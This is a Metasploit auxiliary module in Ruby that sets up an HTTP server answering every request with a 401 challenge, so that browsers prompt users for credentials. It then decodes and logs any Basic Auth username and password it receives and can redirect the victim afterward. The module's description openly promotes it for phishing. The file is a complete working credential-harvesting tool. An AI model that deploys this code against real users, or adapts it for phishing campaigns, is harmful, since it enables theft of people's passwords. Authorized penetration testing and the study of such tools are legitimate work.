##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'HTTP Client Basic Authentication Credential Collector',
      'Description'    => %q{
        This module responds to all requests for resources with a HTTP 401.  This should
        cause most browsers to prompt for a credential.  If the user enters Basic Auth creds
        they are sent to the console.

        This may be helpful in some phishing expeditions where it is possible to embed a
        resource into a page.

        This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
      },
      'Author'      => ['saint patrick <saintpatrick[at]l1pht.com>'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    ))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
        OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
        OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ])
      ], self.class)
  end

  # Not compatible today
  def support_ipv6?
    false
  end

  def run
    @myhost   = datastore['SRVHOST']
    @myport   = datastore['SRVPORT']
    @realm    = datastore['REALM']

    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit
  end

  def on_request_uri(cli, req)
    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
      basic,auth = req['Authorization'].split(/\s+/)
      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)

      report_auth_info(
        :host        => cli.peerhost,
        :port        => datastore['SRVPORT'],
        :sname       => 'HTTP',
        :user        => user,
        :pass        => pass,
        :source_type => "captured",
        :active      => true
      )

      print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
      if datastore['RedirectURL']
        print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
        send_redirect(cli, datastore['RedirectURL'])
      else
        send_not_found(cli)
      end
    else
      print_status("Sending 401 to client #{cli.peerhost}")
      response = create_response(401, "Unauthorized")
      response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
      cli.send_response(response)
    end
  end

end
